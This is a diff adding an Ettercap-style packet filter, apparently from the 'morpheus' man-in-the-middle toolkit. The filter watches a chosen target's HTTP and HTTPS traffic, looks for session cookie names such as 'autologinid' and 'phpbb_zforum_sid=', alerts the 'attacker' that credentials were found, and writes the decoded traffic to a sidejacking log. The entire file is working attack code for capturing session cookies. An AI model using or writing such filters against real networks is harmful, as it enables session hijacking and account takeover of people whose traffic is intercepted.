@@ -1,0 +1,65 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+
+##
+#  This filter display port 80 (tcp) And port 443 (https) traffic
+#  from selected target host, And it will warn attacker If any auth
+#  cookie its captured And stored into morpheus/logs/sidejacking.log 
+#  'this module will accept morpheus inputs (one cookie name to filter)'
+##
+
+
+
+#
+# Report port 443/tcp (HTTPS) only to make terminal displays.
+#
+if (ip.proto == TCP && tcp.src == 443 || tcp.dst == 443) {
+ msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:443 HTTPS ☆");
+}
+
+
+#
+# Report port 80/tcp (HTTP) traffic
+# And warn attacker If any auth cookie has captured...
+#
+if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
+ msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:80 HTTP ☆");
+  # search For string authcookie inside head field.
+  if (search(DATA.data, "autologinid")) {
+    msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
+    msg("[morpheus] | status: AuthCookie detected ☠");
+    msg("[morpheus] |  port : 80/TCP authentication ✔");
+    msg("[morpheus] |  info : credentials found, log stored ✔");
+    msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
+    log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
+  }else{
+  if (search(DATA.data, "phpbb_zforum_sid=")) {
+    msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
+    msg("[morpheus] | status: AuthCookie detected ☠");
+    msg("[morpheus] |  port : 80/TCP authentication ✔");
+    msg("[morpheus] |  info : credentials found, log stored ✔");
+    msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
+    log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
+  }else{
+  if (search(DATA.data, "UsErInPut")) {
+    msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
+    msg("[morpheus] | status: AuthCookie detected ☠");
+    msg("[morpheus] |  port : 80/TCP authentication ✔");
+    msg("[morpheus] |  info : credentials found, log stored ✔");
+    msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
+    log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
+  }
+  }
+  }
+}
+
